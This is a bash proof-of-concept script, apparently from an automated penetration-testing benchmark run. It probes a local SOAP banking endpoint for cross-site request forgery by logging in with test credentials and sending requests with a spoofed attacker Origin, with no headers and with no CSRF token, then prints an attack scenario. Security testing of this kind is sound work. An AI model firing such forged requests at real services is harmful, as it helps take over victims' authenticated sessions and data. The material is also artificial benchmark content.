#!/bin/bash
# POC: Bash script POC demonstrating CSRF vulnerability in /soap_service endpoint by testing lack of CSRF token validation and missing Origin/Referer header checks
# Target: ./repo
# Created: 2025-10-31T16:55:16.999Z
# Session: benchmark-XBEN-032-24-mhf2utzd

# CSRF Vulnerability POC - SOAP Service
# This POC demonstrates that the /soap_service endpoint accepts requests without CSRF token validation
# and doesn't validate Origin/Referer headers that would prevent CSRF attacks

echo "=================================================="
echo "CSRF Vulnerability POC - SOAP Service"
echo "=================================================="
echo ""

TARGET_URL="http://localhost:5000"
SOAP_ENDPOINT="${TARGET_URL}/soap_service"
LOGIN_ENDPOINT="${TARGET_URL}/login"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# SOAP payloads
ACCOUNT_INFO_PAYLOAD='<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <GetAccountInfoRequest xmlns="http://example.com/banking">
            <accountId>12345</accountId>
        </GetAccountInfoRequest>
    </soap:Body>
</soap:Envelope>'

ACCOUNT_HOLDER_PAYLOAD='<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <GetAccountHolderInfoRequest xmlns="http://example.com/banking">
            <accountId>12345</accountId>
        </GetAccountHolderInfoRequest>
    </soap:Body>
</soap:Envelope>'

echo "[*] Step 1: Authenticating as test user 'john'..."
echo ""

# Login and capture session cookie
LOGIN_RESPONSE=$(curl -s -c /tmp/csrf_cookies.txt -X POST "${LOGIN_ENDPOINT}" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=john&password=password123" \
    -w "\nHTTP_CODE:%{http_code}")

HTTP_CODE=$(echo "$LOGIN_RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)

if [ "$HTTP_CODE" = "302" ] || [ "$HTTP_CODE" = "200" ]; then
    echo -e "${GREEN}[✓] Authentication successful${NC}"
    echo ""
else
    echo -e "${RED}[✗] Authentication failed with HTTP code: $HTTP_CODE${NC}"
    echo "Response: $LOGIN_RESPONSE"
    echo ""
    echo "[*] Continuing with unauthenticated test to check CSRF protection..."
    echo ""
fi

echo "=================================================="
echo "CSRF VULNERABILITY TESTS"
echo "=================================================="
echo ""

echo "[*] Test 1: SOAP request with malicious Origin header"
echo "      (Simulating request from attacker's domain)"
echo ""

RESPONSE_1=$(curl -s -b /tmp/csrf_cookies.txt -X POST "${SOAP_ENDPOINT}" \
    -H "Content-Type: application/xml" \
    -H "Origin: https://attacker-evil-site.com" \
    -H "Referer: https://attacker-evil-site.com/malicious-page.html" \
    -d "$ACCOUNT_INFO_PAYLOAD" \
    -w "\nHTTP_CODE:%{http_code}")

HTTP_CODE_1=$(echo "$RESPONSE_1" | grep "HTTP_CODE:" | cut -d: -f2)
RESPONSE_BODY_1=$(echo "$RESPONSE_1" | sed '/HTTP_CODE:/d')

echo "Origin: https://attacker-evil-site.com"
echo "Referer: https://attacker-evil-site.com/malicious-page.html"
echo ""
echo "HTTP Status Code: $HTTP_CODE_1"
echo ""

if [ "$HTTP_CODE_1" = "200" ]; then
    echo -e "${RED}[!] VULNERABILITY CONFIRMED: Server accepted request from malicious origin!${NC}"
    echo ""
    echo "Response snippet:"
    echo "$RESPONSE_BODY_1" | head -n 10
    echo ""
else
    echo "Response: $RESPONSE_BODY_1"
    echo ""
fi

echo "--------------------------------------------------"
echo ""

echo "[*] Test 2: SOAP request WITHOUT any Origin/Referer headers"
echo "      (Simulating request with stripped headers)"
echo ""

RESPONSE_2=$(curl -s -b /tmp/csrf_cookies.txt -X POST "${SOAP_ENDPOINT}" \
    -H "Content-Type: application/xml" \
    -d "$ACCOUNT_HOLDER_PAYLOAD" \
    -w "\nHTTP_CODE:%{http_code}")

HTTP_CODE_2=$(echo "$RESPONSE_2" | grep "HTTP_CODE:" | cut -d: -f2)
RESPONSE_BODY_2=$(echo "$RESPONSE_2" | sed '/HTTP_CODE:/d')

echo "Origin: (not sent)"
echo "Referer: (not sent)"
echo ""
echo "HTTP Status Code: $HTTP_CODE_2"
echo ""

if [ "$HTTP_CODE_2" = "200" ]; then
    echo -e "${RED}[!] VULNERABILITY CONFIRMED: Server accepted request without Origin/Referer!${NC}"
    echo ""
    echo "Response snippet:"
    echo "$RESPONSE_BODY_2" | head -n 10
    echo ""
else
    echo "Response: $RESPONSE_BODY_2"
    echo ""
fi

echo "--------------------------------------------------"
echo ""

echo "[*] Test 3: Check for CSRF token requirement"
echo "      (Sending request without any CSRF token)"
echo ""

RESPONSE_3=$(curl -s -b /tmp/csrf_cookies.txt -X POST "${SOAP_ENDPOINT}" \
    -H "Content-Type: application/xml" \
    -H "Origin: ${TARGET_URL}" \
    -d "$ACCOUNT_INFO_PAYLOAD" \
    -w "\nHTTP_CODE:%{http_code}")

HTTP_CODE_3=$(echo "$RESPONSE_3" | grep "HTTP_CODE:" | cut -d: -f2)
RESPONSE_BODY_3=$(echo "$RESPONSE_3" | sed '/HTTP_CODE:/d')

echo "CSRF Token: (not provided)"
echo ""
echo "HTTP Status Code: $HTTP_CODE_3"
echo ""

if [ "$HTTP_CODE_3" = "200" ]; then
    echo -e "${RED}[!] VULNERABILITY CONFIRMED: No CSRF token validation!${NC}"
    echo ""
    echo "Response snippet:"
    echo "$RESPONSE_BODY_3" | head -n 10
    echo ""
else
    echo "Response: $RESPONSE_BODY_3"
    echo ""
fi

echo "=================================================="
echo "VULNERABILITY SUMMARY"
echo "=================================================="
echo ""

VULNERABLE=0

if [ "$HTTP_CODE_1" = "200" ]; then
    echo -e "${RED}[!] Server accepts requests from malicious origins${NC}"
    VULNERABLE=1
fi

if [ "$HTTP_CODE_2" = "200" ]; then
    echo -e "${RED}[!] Server doesn't require Origin/Referer headers${NC}"
    VULNERABLE=1
fi

if [ "$HTTP_CODE_3" = "200" ]; then
    echo -e "${RED}[!] Server doesn't validate CSRF tokens${NC}"
    VULNERABLE=1
fi

echo ""

if [ $VULNERABLE -eq 1 ]; then
    echo -e "${RED}[!] CSRF VULNERABILITY CONFIRMED!${NC}"
    echo ""
    echo "The /soap_service endpoint is vulnerable to Cross-Site Request Forgery attacks."
    echo ""
    echo "Attack Scenario:"
    echo "1. Attacker hosts malicious webpage with hidden SOAP request"
    echo "2. Authenticated victim visits attacker's page"
    echo "3. Browser automatically includes session cookie"
    echo "4. SOAP request executes with victim's credentials"
    echo "5. Account information is retrieved and sent to attacker"
    echo ""
    echo "Impact:"
    echo "- Unauthorized access to victim's account information"
    echo "- Potential for unauthorized transactions (if write operations exist)"
    echo "- Session hijacking through information disclosure"
    echo ""
else
    echo -e "${GREEN}[✓] No CSRF vulnerability detected${NC}"
fi

# Cleanup
rm -f /tmp/csrf_cookies.txt

exit 0